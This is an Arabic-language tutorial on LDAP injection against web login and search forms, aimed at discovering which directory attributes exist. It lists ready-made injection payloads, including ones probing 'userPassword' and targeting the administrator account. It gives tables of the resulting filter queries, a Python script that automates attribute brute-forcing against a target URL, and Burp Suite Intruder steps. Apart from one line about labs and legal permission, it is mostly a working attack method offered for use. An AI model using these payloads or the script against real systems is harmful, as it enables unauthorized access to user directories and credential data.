## الخطوات العملية لاكتشاف الخصائص الصالحة
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة وتعديل الطلبات.
   - حدد حقل إدخال يتفاعل مع LDAP (مثل حقل اسم المستخدم في نموذج تسجيل الدخول، حقل البحث، أو معايير URL).
2. **اختبار خاصية واحدة**:
   - أدخل استعلام LDAP يحتوي على خاصية معينة مع علامة بدل (مثل `*)(userPassword=*)`).
   - أرسل الطلب وتحقق من الاستجابة.
3. **تكرار العملية**:
   - كرر الاختبار مع قائمة من الخصائص الشائعة (مثل `uid`, `cn`, `sn`, `mail`).
   - سجّل الخصائص التي تعيد استجابة إيجابية (مثل صفحة مختلفة أو نتيجة بحث).
4. **مراقبة الاستجابات**:
   - حدد كيف يُظهر التطبيق أن الخاصية صالحة:
     - **إيجابية**: صفحة تحتوي على نص معين (مثل "Welcome")، رمز حالة HTTP 200، نتيجة بحث، أو عدم ظهور خطأ.
     - **سلبية**: خطأ (مثل "Invalid credentials")، رمز حالة HTTP 403، أو صفحة فارغة.
5. **أتمتة العملية (اختياري)**:
   - إذا كنت تختبر العديد من الخصائص، استخدم سكربت لأتمتة إرسال الطلبات وتحليل الاستجابات.

---

## جميع المحاولات الممكنة لاكتشاف الخصائص الصالحة
في هذه الخطوة، المحاولات تعتمد على إدخال استعلامات LDAP تحتوي على أسماء خصائص محتملة مع علامة بدل (`*`) لاختبار وجودها. سأقسم المحاولات إلى:
1. **الخصائص الشائعة**: قائمة بالخصائص القياسية التي تُستخدم غالبًا في خوادم LDAP.
2. **الاستعلامات اليدوية**: للاختبار اليدوي باستخدام Burp Suite أو نموذج الإدخال.
3. **الأتمتة**: كيفية استخدام سكربت لاختبار الخصائص تلقائيًا.

### 1. الخصائص الشائعة
خوادم LDAP (مثل OpenLDAP أو Active Directory) تستخدم خصائص قياسية لتخزين بيانات المستخدمين والكائنات. إليك قائمة بالخصائص الشائعة التي يجب اختبارها:
- `uid`: معرف المستخدم (User ID).
- `cn`: الاسم الشائع (Common Name).
- `sn`: اللقب أو اسم العائلة (Surname).
- `userPassword`: كلمة المرور (غالبًا مشفرة).
- `mail`: عنوان البريد الإلكتروني.
- `givenName`: الاسم الأول.
- `objectClass`: نوع الكائن (مثل `person`, `organizationalUnit`).
- `name`: الاسم الكامل.
- `surname`: اسم العائلة (مرادف لـ `sn`).
- `commonName`: مرادف لـ `cn`.
- `displayName`: الاسم المعروض.
- `telephoneNumber`: رقم الهاتف.
- `description`: وصف الكائن.
- `memberOf`: المجموعات التي ينتمي إليها المستخدم.
- `sAMAccountName`: اسم الحساب في Active Directory.
- `userPrincipalName`: اسم المستخدم الرئيسي في Active Directory.

### 2. الاستعلامات اليدوية
تُستخدم هذه الاستعلامات عند اختبار الخصائص يدويًا عبر حقل إدخال (مثل حقل اسم المستخدم أو البحث) أو باستخدام Burp Suite Repeater. الهدف هو تحديد أي الخصائص مدعومة بناءً على استجابة التطبيق.

#### أ. اختبار كل خاصية مع علامة بدل
- **الاستعلام**: `*)(ATTRIBUTE=*)`
- **الإدخال**:
  - اسم المستخدم: `*)(ATTRIBUTE=*)`
  - كلمة المرور: `anything` (أو اتركه فارغًا إذا لزم الأمر)
- **الخصائص للاختبار** (استبدل `ATTRIBUTE` بكل خاصية):
  - `*)(uid=*)`
  - `*)(cn=*)`
  - `*)(sn=*)`
  - `*)(userPassword=*)`
  - `*)(mail=*)`
  - `*)(givenName=*)`
  - `*)(objectClass=*)`
  - `*)(name=*)`
  - `*)(surname=*)`
  - `*)(commonName=*)`
  - `*)(displayName=*)`
  - `*)(telephoneNumber=*)`
  - `*)(description=*)`
  - `*)(memberOf=*)`
  - `*)(sAMAccountName=*)`
  - `*)(userPrincipalName=*)`
- **كيف يعمل**:
  - الاستعلام `*)(ATTRIBUTE=*)` يختبر ما إذا كانت الخاصية موجودة في الدليل.
  - مثال: إدخال `*)(userPassword=*)` ينتج استعلامًا مثل:
    ```
    (&(uid=*)(userPassword=*))(userPassword=anything))
    ```
  - إذا كانت الاستجابة **إيجابية** (مثل صفحة تحتوي على نص، نتيجة بحث، أو رمز حالة HTTP 200)، فالخاصية `userPassword` صالحة.
  - إذا كانت الاستجابة **سلبية** (مثل خطأ "Invalid credentials" أو صفحة فارغة)، فالخاصية غير صالحة.
- **متى يُستخدم؟**:
  - عند الاختبار اليدوي لتحديد الخصائص المدعومة.
  - عندما تريد تأكيد وجود خاصية معينة قبل استهدافها في هجمات أخرى (مثل الاستغلال الأعمى).

#### ب. اختبار الخصائص مع مستخدم معين
- **الاستعلام**: `(&(sn=administrator)(ATTRIBUTE=*))`
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(ATTRIBUTE=*))`
  - كلمة المرور: `anything`
- **الخصائص للاختبار** (استبدل `ATTRIBUTE` بكل خاصية):
  - `admin*)(&(sn=administrator)(uid=*))`
  - `admin*)(&(sn=administrator)(cn=*))`
  - `admin*)(&(sn=administrator)(sn=*))`
  - `admin*)(&(sn=administrator)(userPassword=*))`
  - `admin*)(&(sn=administrator)(mail=*))`
  - ... (كرر لجميع الخصائص المذكورة أعلاه)
- **كيف يعمل**:
  - يستهدف مستخدمًا معينًا (مثل `administrator`) ويختبر ما إذا كانت الخاصية موجودة له.
  - الاستعلام الناتج: 
    ```
    (&(uid=admin*)(&(sn=administrator)(userPassword=*))(userPassword=anything))
    ```
  - إذا كانت الاستجابة إيجابية، فالخاصية صالحة لمستخدم `administrator`.
- **متى يُستخدم؟**:
  - إذا كنت تعرف اسم مستخدم معين (مثل `administrator`) وتريد التحقق من الخصائص المرتبطة به.
  - عندما يكون التطبيق يقيد الاستعلامات بمستخدم معين.

#### ج. اختبار الخصائص في نموذج بحث
- **الاستعلام**: `(ATTRIBUTE=*)`
- **الإدخال**:
  - حقل البحث: `(ATTRIBUTE=*)`
  - أمثلة:
    - `(uid=*)`
    - `(cn=*)`
    - `(sn=*)`
    - `(userPassword=*)`
    - ... (كرر لجميع الخصائص)
- **كيف يعمل**:
  - إذا كان الموقع يحتوي على نموذج بحث (مثل البحث عن موظفين)، يتم إدخال الاستعلام مباشرة في حقل البحث.
  - الاستعلام الناتج: `(userPassword=*)`
  - إذا أعاد الموقع نتائج (مثل قائمة مستخدمين أو بيانات)، فالخاصية صالحة.
- **متى يُستخدم؟**:
  - عندما يكون لديك نموذج بحث يتفاعل مع LDAP.
  - عندما تريد اختبار الخصائص في سياق استعلامات البحث.

### 3. الأتمتة باستخدام سكربت
الاختبار اليدوي للخصائص قد يكون بطيئًا إذا كنت تختبر قائمة طويلة. يمكنك استخدام سكربت لأتمتة العملية. السكربت يرسل طلبات تحتوي على كل خاصية ويحلل الاستجابات لتحديد الخصائص الصالحة.

#### سكربت Python لاكتشاف الخصائص
```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://TARGET_URL.com/'  # استبدل بـ URL الموقع
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data={'login': '*)('+str(i)+'=*))\x00', 'password': 'bla'})
    if 'TRUE CONDITION' in r.text:  # استبدل TRUE CONDITION بنص يظهر عند النجاح
        fields.append(str(i))

print(fields)
```
- **الإعداد**:
  - أنشئ ملفًا يسمى `dic` يحتوي على قائمة بالخصائص (كل خاصية في سطر):
    ```
    uid
    cn
    sn
    userPassword
    mail
    givenName
    objectClass
    name
    surname
    commonName
    displayName
    telephoneNumber
    description
    memberOf
    sAMAccountName
    userPrincipalName
    ```
  - استبدل `https://TARGET_URL.com/` بعنوان الموقع المستهدف.
  - استبدل `'TRUE CONDITION'` بنص يظهر في الاستجابة عندما تكون الخاصية صالحة (مثل "Welcome" أو رمز حالة HTTP 200).
- **التشغيل**:
  - `python3 discover_fields.py`
- **المخرجات**:
  - يطبع قائمة بالخصائص الصالحة (مثل `['uid', 'cn', 'userPassword']`).

#### كيف يعمل السكربت؟
- يرسل طلب POST لكل خاصية في ملف `dic`، مع إدخال مثل `*)(ATTRIBUTE=*))\x00` في حقل `login`.
- يتحقق من الاستجابة: إذا احتوت على `'TRUE CONDITION'`, تُضاف الخاصية إلى قائمة `fields`.
- يساعد في تسريع العملية مقارنة بالاختبار اليدوي.

---

## نصائح لاختبار الخصائص الصالحة
1. **ابدأ بالخصائص الشائعة**:
   - ركز على `uid`, `cn`, `sn`, `userPassword`, `mail` لأنها الأكثر استخدامًا.
2. **استخدم Burp Suite**:
   - استخدم **Repeater** لإرسال الطلبات يدويًا وتعديل الخصائص بسرعة.
   - استخدم **Intruder** لاختبار قائمة خصائص تلقائيًا (قم بتحميل قائمة الخصائص في قسم Payloads).
3. **راقب الاستجابات بعناية**:
   - ابحث عن تغيرات في الاستجابة (مثل نص معين، رمز حالة HTTP، أو طول الاستجابة).
   - بعض التطبيقات قد تُظهر استجابات خفية (مثل تأخير زمني) تشير إلى أن الخاصية صالحة.
4. **جرب سياقات مختلفة**:
   - إذا لم تنجح الخصائص في نموذج تسجيل الدخول، جربها في نموذج بحث أو معايير URL.
   - مثال: `?search=(cn=*)` في عنوان URL.
5. **اختبر في بيئة آمنة**:
   - استخدم معملًا (مثل TryHackMe أو HackTheBox) لتجربة هذه الاستعلامات قبل اختبار موقع حقيقي.
   - تأكد من وجود إذن قانوني إذا كنت تختبر موقعًا حقيقيًا.

---

## ملخص جميع المحاولات
فيما يلي جدول يلخص جميع الاستعلامات التي يمكنك تجربتها لاكتشاف الخصائص الصالحة، مع الإدخال والغرض:

| **الخاصية**            | **الإدخال في حقل اسم المستخدم**                     | **الاستعلام الناتج**                                                                 | **الغرض**                                                                 |
|-------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| `uid`                   | `*)(uid=*)`                                         | `(&(uid=*)(uid=*))(userPassword=anything))`                                          | اختبار وجود معرف المستخدم.                                              |
| `cn`                    | `*)(cn=*)`                                          | `(&(uid=*)(cn=*))(userPassword=anything))`                                           | اختبار وجود الاسم الشائع.                                               |
| `sn`                    | `*)(sn=*)`                                          | `(&(uid=*)(sn=*))(userPassword=anything))`                                           | اختبار وجود اللقب.                                                      |
| `userPassword`          | `*)(userPassword=*)`                                | `(&(uid=*)(userPassword=*))(userPassword=anything))`                                 | اختبار وجود كلمة المرور.                                                |
| `mail`                  | `*)(mail=*)`                                        | `(&(uid=*)(mail=*))(userPassword=anything))`                                         | اختبار وجود البريد الإلكتروني.                                          |
| `givenName`             | `*)(givenName=*)`                                   | `(&(uid=*)(givenName=*))(userPassword=anything))`                                    | اختبار وجود الاسم الأول.                                                |
| `objectClass`           | `*)(objectClass=*)`                                 | `(&(uid=*)(objectClass=*))(userPassword=anything))`                                  | اختبار وجود نوع الكائن.                                                 |
| `name`                  | `*)(name=*)`                                        | `(&(uid=*)(name=*))(userPassword=anything))`                                         | اختبار وجود الاسم الكامل.                                               |
| `surname`               | `*)(surname=*)`                                     | `(&(uid=*)(surname=*))(userPassword=anything))`                                      | اختبار وجود اسم العائلة.                                                |
| `commonName`            | `*)(commonName=*)`                                  | `(&(uid=*)(commonName=*))(userPassword=anything))`                                   | اختبار وجود الاسم الشائع (مرادف لـ `cn`).                               |
| `displayName`           | `*)(displayName=*)`                                 | `(&(uid=*)(displayName=*))(userPassword=anything))`                                  | اختبار وجود الاسم المعروض.                                              |
| `telephoneNumber`       | `*)(telephoneNumber=*)`                             | `(&(uid=*)(telephoneNumber=*))(userPassword=anything))`                              | اختبار وجود رقم الهاتف.                                                 |
| `description`           | `*)(description=*)`                                 | `(&(uid=*)(description=*))(userPassword=anything))`                                  | اختبار وجود وصف الكائن.                                                 |
| `memberOf`              | `*)(memberOf=*)`                                    | `(&(uid=*)(memberOf=*))(userPassword=anything))`                                     | اختبار وجود المجموعات.                                                  |
| `sAMAccountName`        | `*)(sAMAccountName=*)`                              | `(&(uid=*)(sAMAccountName=*))(userPassword=anything))`                               | اختبار وجود اسم الحساب في Active Directory.                             |
| `userPrincipalName`     | `*)(userPrincipalName=*)`                           | `(&(uid=*)(userPrincipalName=*))(userPassword=anything))`                            | اختبار وجود اسم المستخدم الرئيسي في Active Directory.                  |

### محاولات مع مستخدم معين
| **الخاصية**            | **الإدخال في حقل اسم المستخدم**                     | **الاستعلام الناتج**                                                                 | **الغرض**                                                                 |
|-------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| `uid`                   | `admin*)(&(sn=administrator)(uid=*))`               | `(&(uid=admin*)(&(sn=administrator)(uid=*))(userPassword=anything))`                 | اختبار `uid` لمستخدم `administrator`.                                    |
| `cn`                    | `admin*)(&(sn=administrator)(cn=*))`                | `(&(uid=admin*)(&(sn=administrator)(cn=*))(userPassword=anything))`                  | اختبار `cn` لمستخدم `administrator`.                                     |
| `sn`                    | `admin*)(&(sn=administrator)(sn=*))`                | `(&(uid=admin*)(&(sn=administrator)(sn=*))(userPassword=anything))`                  | اختبار `sn` لمستخدم `administrator`.                                     |
| ... (كرر لجميع الخصائص) | ...                                                 | ...                                                                                  | ...                                                                       |

### محاولات في نموذج بحث
| **الخاصية**            | **الإدخال في حقل البحث**                           | **الاستعلام الناتج**                                                                 | **الغرض**                                                                 |
|-------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| `uid`                   | `(uid=*)`                                           | `(uid=*)`                                                                            | اختبار وجود `uid` في استعلامات البحث.                                   |
| `cn`                    | `(cn=*)`                                            | `(cn=*)`                                                                             | اختبار وجود `cn` في استعلامات البحث.                                    |
| `sn`                    | `(sn=*)`                                            | `(sn=*)`                                                                             | اختبار وجود `sn` في استعلامات البحث.                                    |
| ... (كرر لجميع الخصائص) | ...                                                 | ...                                                                                  | ...                                                                       |

---

## مثال عملي باستخدام Burp Suite
لنفترض أنك تختبر موقعًا باستخدام Burp Suite:
1. اضبط المتصفح لتوجيه حركة المرور عبر Burp Suite (افتراضيًا `127.0.0.1:8080`).
2. افتح نموذج تسجيل الدخول أو البحث وأدخل:
   - اسم المستخدم: `*)(userPassword=*)`
   - كلمة المرور: `anything`
3. في Burp Suite:
   - انتقل إلى **Proxy > HTTP History** وابحث عن الطلب المرسل (POST أو GET).
   - انسخ الطلب إلى **Repeater**.
4. في **Repeater**:
   - أرسل الطلب وتحقق من الاستجابة (مثل رمز الحالة، محتوى الصفحة، أو نص معين).
   - إذا كانت الاستجابة إيجابية (مثل صفحة تحتوي على "Welcome" أو رمز 200)، فـ `userPassword` صالحة.
   - كرر العملية مع خصائص أخرى (مثل `*)(cn=*)`, `*)(sn=*)`).
5. إذا كنت تستخدم **Intruder**:
   - ضع قائمة الخصائص في قسم Payloads (مثل `uid`, `cn`, `sn`, ...).
   - عدّل الطلب ليحتوي على `*)(§ATTRIBUTE§=*)` وحدد `ATTRIBUTE` كموقع Payload.
   - ابدأ الهجوم وتحقق من الاستجابات لتحديد الخصائص الصالحة.

---
